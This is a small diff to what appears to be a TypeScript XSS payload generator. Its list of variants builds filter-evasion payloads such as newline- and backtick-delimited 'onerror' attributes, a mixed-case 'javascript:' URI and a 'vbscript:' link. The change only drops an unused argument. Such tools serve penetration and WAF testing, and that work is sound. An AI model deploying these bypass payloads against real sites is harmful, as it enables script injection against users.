@@ -51,7 +51,7 @@ const VARIANTS: Variant[] = [
   { id: 'newline-sep',  category: 'WAF',    label: '<img\\n onerror>',      description: 'Newline as attribute separator',                           build: s => `<img\nsrc=x\nonerror=${s}>` },
   { id: 'backtick',     category: 'WAF',    label: 'Backtick attr delim',   description: 'Backtick as attribute delimiter — works in IE',            build: s => `<img src=x onerror=\`${s}\`>` },
   { id: 'proto-bypass', category: 'WAF',    label: 'jaVasCriPt: URI',       description: 'Mixed-case javascript: protocol — bypasses naive checks',  build: s => `<a href="jaVasCriPt:${s}">click</a>` },
-  { id: 'vbs',          category: 'WAF',    label: 'vbscript: (IE)',         description: 'VBScript URI — Internet Explorer only',                    build: s => `<a href="vbscript:msgbox(1)">click</a>` },
+  { id: 'vbs',          category: 'WAF',    label: 'vbscript: (IE)',         description: 'VBScript URI — Internet Explorer only',                    build: () => `<a href="vbscript:msgbox(1)">click</a>` },
   // HTML encoding
   { id: 'html-named',   category: 'HTML',   label: 'Named entities',        description: 'Replace < > " \' / & with named HTML entities',            build: htmlNamed },
   { id: 'html-dec',     category: 'HTML',   label: 'Decimal entities',      description: 'Every char as &#NNN;',                                     build: htmlDec },
